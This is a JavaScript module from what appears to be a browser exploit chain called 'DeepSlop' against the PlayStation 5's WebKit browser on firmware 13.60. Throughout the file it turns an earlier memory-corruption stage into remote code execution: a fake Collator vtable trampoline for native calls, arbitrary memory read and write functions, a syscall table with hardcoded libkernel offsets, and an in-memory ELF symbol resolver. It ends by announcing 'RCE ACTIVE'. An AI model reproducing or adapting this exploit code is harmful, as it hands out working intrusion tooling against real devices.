(function () {
    "use strict";
    if (!window._ds || !window._ds.composition || window._ds.kernel) return;
    var _ds = window._ds;
    var c = _ds.c;
    var s = _ds.s;
    var buf = _ds.buf;
    var mark = _ds.mark;

    var scratchBytes = buf.scratchBytes;
    var scratchWords = buf.scratchWords;
    var collatorOriginal = buf.collatorOriginal;

    function initKernel() {
        var k = Number(s.kernelBase), b = Number(s.arenaBacking), av = s.arenaView, rw = s.rwView;

        var S = (window.deepslopStubs && window.deepslopStubs.addresses) ? window.deepslopStubs.addresses : null;
        var SK = {
            getpid: k + c.P_GETPID_EXP,
            close:  k + c.P_CLOSE_EXP,
            socket: (S && S.socket)     || k+0x1adc1,
            write:  (S && S.write)      || k+0x1aae1,
            read:   (S && S.read)       || k+0x1aa61,
            open:   (S && S.open)       || k+0x1b181,
            pipe:   (S && S.pipe)       || k+0x1b4c1,
            sockpair: (S && S.socketpair) || k+0x1b5a1,
            sso:    (S && S.setsockopt) || k+0x1c1c1,
            gso:    (S && S.getsockopt) || k+0x1c2a1,
            fcntl:  (S && S.fcntl)      || k+0x1b8a1,
            ns:     (S && S.nanosleep)  || k+0x1ba01,
            unlink: (S && S.unlink)     || null,
            thr_self: (S && S.thr_self) || null,
        };

        function pl(off, val) {
            for (var i = 0; i < 6; i++) av[off + i] = Math.floor(val / Math.pow(2, i * 8)) & 0xFF;
        }

        // Native one-shot call via Collator vtable trampoline
        window.call_native = function (addr, rdi, rcx, r8, r9) {
            if (!s.notifyReady) return 0;
            rdi = (rdi || 0); rcx = (rcx || 0);
            pl(0x300 + 0x128, s.naturalTrampolineAddress);
            pl(0x100 + 0xe0, addr);
            pl(0x100 + 0x48, rdi);
            pl(0x100 + 0x60, rcx);
            var hi = Math.floor(s.fakeUCollatorAddress / 0x100000000);
            var lo = s.fakeUCollatorAddress - hi * 0x100000000;
            scratchWords[0] = lo; scratchWords[1] = hi;
            for (var i = 0; i < 8; i++) rw[i] = scratchBytes[i];
            var r = 0;
            try { r = s.compareFn(s.notificationRequest, "b"); } catch (e) {}
            for (var j = 0; j < collatorOriginal.length; j++) rw[j] = collatorOriginal[j];
            pl(0x300 + 0x128, k + 0x1cb93);
            pl(0x100 + 0xe0, k + 0xc7);
            return r;
        };

        var hp = b + 0xE00;
        var ao = function(a) { return Number(BigInt(a) - BigInt(b)); };
        window.malloc = function(sz) { var a = BigInt(hp); hp += (sz + 7) & ~7; return a; };
        window.alloc_string = function(str) {
            var a = window.malloc(str.length + 1), o = ao(a);
            for (var i = 0; i < str.length; i++) av[o + i] = str.charCodeAt(i) & 0xFF;
            av[o + str.length] = 0;
            return a;
        };

        window.write8  = function(a, v) { av[ao(a)] = Number(v) & 0xFF; };
        window.write32 = function(a, v) {
            var o = ao(a), n = Number(v) >>> 0;
            for (var i = 0; i < 4; i++) av[o + i] = (n >> (i * 8)) & 0xFF;
        };
        window.write64 = function(a, v) {
            var V = BigInt(v);
            window.write32(a, Number(V & 0xFFFFFFFFn) >>> 0);
            window.write32(Number(a) + 4, Number((V >> 32n) & 0xFFFFFFFFn) >>> 0);
        };
        window.read8  = function(a) { return BigInt(av[ao(a)]); };
        window.read32 = function(a) {
            var o = ao(a);
            return BigInt((av[o] | av[o+1]<<8 | av[o+2]<<16 | av[o+3]<<24) >>> 0);
        };
        window.read64 = function(a) {
            var o = ao(a); var lo = 0n, hi = 0n;
            for (var i = 0; i < 4; i++) { lo |= BigInt(av[o+i]) << BigInt(i*8); hi |= BigInt(av[o+4+i]) << BigInt(i*8); }
            return (hi << 32n) | lo;
        };

        window.readBytes = function(a, len) {
            var out = new Uint8Array(len);
            var o = ao(a);
            for (var i = 0; i < len; i++) out[i] = av[o + i];
            return out;
        };

        window.writeBytes = function(a, uint8) {
            var o = ao(a);
            for (var i = 0; i < uint8.length; i++) av[o + i] = uint8[i];
        };

        // Hex formatting helper for in-browser inspection
        window.hexDump = function(bytes, offset, maxLen) {
            offset = offset || 0;
            maxLen = Math.min(bytes.length, maxLen || 256);
            var lines = [];
            for (var i = 0; i < maxLen; i += 16) {
                var hex = [], ascii = [];
                for (var j = 0; j < 16; j++) {
                    if (i + j < maxLen) {
                        var val = bytes[i + j];
                        hex.push((val < 16 ? "0" : "") + val.toString(16).toUpperCase());
                        ascii.push((val >= 32 && val <= 126) ? String.fromCharCode(val) : ".");
                    } else {
                        hex.push("  ");
                    }
                }
                var addrStr = (offset + i).toString(16).padStart(8, "0");
                lines.push(addrStr + "  " + hex.slice(0, 8).join(" ") + "  " + hex.slice(8).join(" ") + " |" + ascii.join("") + "|");
            }
            return lines.join("\n");
        };

        var SC = {};
        "pipe,2a;unlink,a;socketpair,87;thr_self,1b0;thr_exit,1af;sched_yield,14b;thr_new,1c7;cpuset_getaffinity,1e7;cpuset_setaffinity,1e8;rtprio_thread,1d2;evf_create,21a;evf_delete,21b;evf_set,220;evf_clear,221;thr_suspend_ucontext,278;thr_resume_ucontext,279;aio_multi_delete,296;aio_multi_wait,297;aio_multi_poll,298;aio_multi_cancel,29a;aio_submit_cmd,29d;getpid,14;socket,61;setsockopt,69;getsockopt,6a;fcntl,5c;write,4;read,3;close,6;open,5;nanosleep,1ab;dlsym,24e;shm_open,17e;shm_unlink,17f;mprotect,4a"
            .split(";").forEach(function(p) { var parts = p.split(","); SC[parts[0]] = BigInt("0x" + parts[1]); });

        var SM = {};
        SM[0x14n] = SK.getpid; SM[0x61n] = SK.socket; SM[0x69n] = SK.sso; SM[0x6an] = SK.gso;
        SM[0x4n]  = SK.write;  SM[0x3n]  = SK.read;   SM[0x6n]  = SK.close; SM[0x5n]  = SK.open;
        SM[0x2an] = SK.pipe;   SM[0x87n] = SK.sockpair; SM[0x1abn] = SK.ns;
        
        if (SK.unlink)   SM[0x0an] = SK.unlink;
        if (SK.thr_self) SM[0x1b0n] = SK.thr_self;

        
        // In-Memory ELF Dynamic Symbol Resolver
        window.resolveSymbol = function(baseAddr, targetSymbol) {
            baseAddr = Number(baseAddr);
            if (!baseAddr) return 0;
            
            // 1. Validate ELF Magic
            var magic = window.read32(baseAddr);
            if (magic !== 0x464C457Fn) return 0; // "ELF"
            
            // 2. Read e_phoff and e_phnum
            var phoff = Number(window.read64(baseAddr + 0x20));
            var phentsize = Number(window.read16 ? window.read16(baseAddr + 0x36) : (window.read32(baseAddr + 0x36) & 0xFFFFn));
            var phnum = Number(window.read16 ? window.read16(baseAddr + 0x38) : (window.read32(baseAddr + 0x38) & 0xFFFFn));
            if (!phentsize) phentsize = 0x38;
            
            var dynAddr = 0, dynSize = 0;
            for (var i = 0; i < phnum; i++) {
                var ph = baseAddr + phoff + (i * phentsize);
                var p_type = Number(window.read32(ph));
                if (p_type === 2) { // PT_DYNAMIC
                    dynAddr = Number(window.read64(ph + 0x10));
                    dynSize = Number(window.read64(ph + 0x28));
                    break;
                }
            }
            if (!dynAddr) return 0;
            dynAddr = baseAddr + dynAddr;
            
            var symtab = 0, strtab = 0, strsz = 0;
            for (var ptr = dynAddr; ptr < dynAddr + dynSize; ptr += 16) {
                var d_tag = Number(window.read64(ptr));
                var d_val = Number(window.read64(ptr + 8));
                if (d_tag === 0) break; // DT_NULL
                if (d_tag === 6) symtab = baseAddr + d_val; // DT_SYMTAB
                if (d_tag === 5) strtab = baseAddr + d_val; // DT_STRTAB
                if (d_tag === 10) strsz = d_val; // DT_STRSZ
            }
            if (!symtab || !strtab) return 0;
            
            // Scan symbols in symtab
            for (var sIdx = 0; sIdx < 1000; sIdx++) {
                var symPtr = symtab + (sIdx * 24);
                var st_name = Number(window.read32(symPtr));
                var st_value = Number(window.read64(symPtr + 8));
                if (st_name === 0 && sIdx > 0) continue;
                if (st_name >= strsz) break;
                
                // Read string from strtab
                var symName = "";
                for (var cIdx = 0; cIdx < 64; cIdx++) {
                    var ch = Number(window.read8(strtab + st_name + cIdx));
                    if (ch === 0) break;
                    symName += String.fromCharCode(ch);
                }
                
                if (symName === targetSymbol) {
                    return baseAddr + st_value;
                }
            }
            return 0;
        };
        _ds.dlsym = window.resolveSymbol;

        window.SYSCALL = SC;
        window.syscall = function(id, a0, a1, a2, a3, a4, a5) {
            var i = (typeof id === "string") ? SC[id] : BigInt(id);
            var st = SM[i];
            if (!st) {
                return -1n;
            }
            var r = call_native(st, a0 != null ? Number(a0) : 0, a3 != null ? Number(a3) : 0);
            return r < 0 ? BigInt(r) | 0xFFFFFFFF00000000n : BigInt(r);
        };

        window.nanosleep = function(ns) {
            var e = Date.now() + Math.max(1, Math.floor(Number(ns) / 1e6));
            while (Date.now() < e) {}
        };
        window.toHex = function(n) { return "0x" + BigInt(n).toString(16); };
        window.LIBKERNEL_HANDLE = -1n;
        window.version_string   = "DeepSlop Standalone 13.60";
        window.check_jailbroken = async function() { return false; };
        window.get_error_string = function() { return "(n/a)"; };
        window.ropReady    = true;
        window.syscallReady = true;

        window.syscallClean = function (id, a0, a3) {
            var n = (typeof id === "string") ? SC[id] : BigInt(id);
            if (n == null) return { error: "unknown syscall: " + id };
            var stub = SM[n];
            if (!stub) return { error: "no libkernel stub mapped for " + id };
            var r;
            try {
                r = call_native(Number(stub),
                    a0 != null ? Number(a0) : 0,
                    a3 != null ? Number(a3) : 0);
            } catch (e) {
                return { error: (e && e.name) + ":" + String(e && e.message).slice(0, 60) };
            }
            return { ok: true, ret: r };
        };

        window.ps5kern = {
            notify: function (text) {
                try { return _ds.sendNotifNatural(String(text)) ? { ok: true } : { error: "notify not armed" }; }
                catch (e) { return { error: String(e && e.message) }; }
            },
            pid: function () { return window.syscallClean(SC.getpid, 0, 0); },
            close: function (fd) { return window.syscallClean(SC.close, Number(fd)); },
            pipe: function () {
                var fds = window.malloc(16);
                var r = window.syscallClean(SC.pipe, Number(fds));
                if (!r || !r.ok) return r || { error: "pipe failed" };
                return { ok: true, fds: [Number(window.read32(fds)), Number(window.read32(Number(fds) + 4))] };
            },
            tid: function () {
                if (!SK.thr_self) return { error: "thr_self stub unavailable" };
                var tid = window.malloc(8);
                var r = window.syscallClean(SC.thr_self, Number(tid));
                if (!r || !r.ok) return r || { error: "thr_self failed" };
                return { ok: true, tid: Number(window.read32(tid)) };
            },
            unlink: function (path) {
                if (!SK.unlink) return { error: "unlink stub unavailable" };
                var p = window.alloc_string(String(path).slice(0, 255));
                return window.syscallClean(SC.unlink, Number(p));
            },
            dumpMemory: function(addr, length) {
                var len = Number(length) || 128;
                return window.readBytes(addr, len);
            }
        };

        mark("KERNEL-JS-INIT", "ok");
    }

    function exposeDeepslopGlobals() {
        try {
            window.deepslopInfo = {
                fw: c.FW_LABEL,
                webkitBase: s.webkitBase, kernelBase: s.kernelBase,
                notifyEntryAddress: s.notifyEntryAddress, naturalTrampolineAddress: s.naturalTrampolineAddress,
                arenaBacking: s.arenaBacking, fakeUCollatorAddress: s.fakeUCollatorAddress,
                carrierSlots: c.CARRIER_SLOTS, drainCount: s.drainCount,
                scan: s.deepslopScan,
            };
        } catch (e) { }
    }

    function runProbeReport() {
        try { initKernel(); } catch (e) { }
        mark("PROBE-REPORT", "webkit=" + _ds.hex(s.webkitBase)
            + "-kernel=" + _ds.hex(s.kernelBase)
            + "-notify=" + _ds.hex(s.notifyEntryAddress)
            + "-trampoline=" + _ds.hex(s.naturalTrampolineAddress));
        if (s.getterCarrier !== null) {
            s.getterCarrier = null;
            s.preparedSymbolObject = null;
            s.fillerGraph = null;
            s.outerGraph = null;
            s.leakedScope = null;
            s.capturedString = null;
            s.capturedWords = null;
            s.keepAlive = null;
            s.predecessorWords = null;
            s.deepslopScan = null;
        }
        exposeDeepslopGlobals();
        exposePayloadGlobals();
        s.stopped = true;
        _ds.catState("ok");
        _ds.setCaption("DeepSlop Standalone PS5 FW " + c.FW_LABEL + " - RCE READY");
        _ds.showStatus("DEEPSLOP READY - 100% On-Device Standalone", "ok");
    }

    function exposePayloadGlobals() {
        if (typeof window === "undefined") return;
        window.send_notification = function (text) {
            _ds.sendNotifNatural(String(text));
        };
        window.log = window.log || (async function (msg) {
            mark("LOG", String(msg));
            if (window._ds_onLog) window._ds_onLog(String(msg));
        });
        window.kernelBase               = s.kernelBase;
        window.arenaBacking             = s.arenaBacking;
        window.arenaView                = s.arenaView;
        window.rwView                   = s.rwView;
        window.compareFn                = s.compareFn;
        window.notificationRequest      = s.notificationRequest;
        window.naturalTrampolineAddress = s.naturalTrampolineAddress;
        window.fakeUCollatorAddress     = s.fakeUCollatorAddress;
        window.scratchWords             = scratchWords;
        window.scratchBytes             = scratchBytes;
        window.collatorOriginal         = collatorOriginal;
        window.notifyReady              = true;
        window.commitStarted            = false;
        window.putLow48                 = _ds.putLow48;
        window.mark                     = mark;
        exposeDeepslopGlobals();
    }

    async function loadAndCommitRce() {
        if (s.getterCarrier !== null) {
            mark("CARRIER-FREE", "releasing refs");
            s.getterCarrier       = null;
            s.preparedSymbolObject = null;
            s.fillerGraph         = null;
            s.outerGraph          = null;
            s.leakedScope         = null;
        }
        await new Promise(function(r) { setTimeout(r, 600); });

        try {
            initKernel();
        } catch (e) {
            mark("KERNEL-JS-INIT-ERR", (e && e.name) + ":" + String(e && e.message).slice(0, 80));
        }

        try {
            _ds.sendNotifNatural("DEEPSLOP STANDALONE - RCE ACTIVE");
        } catch (e) {
            mark("NOTIFY-SEND-ERR", (e && e.name) + ":" + String(e && e.message).slice(0, 80));
        }

        exposePayloadGlobals();
        _ds.showStatus("RCE ACTIVE - Ready for On-Device Payloads", "ok");
    }

    _ds.initKernel = initKernel;
    _ds.exposeDeepslopGlobals = exposeDeepslopGlobals;
    _ds.exposePayloadGlobals = exposePayloadGlobals;
    _ds.runProbeReport = runProbeReport;
    _ds.loadAndCommitRce = loadAndCommitRce;
    _ds.kernel = true;
})();
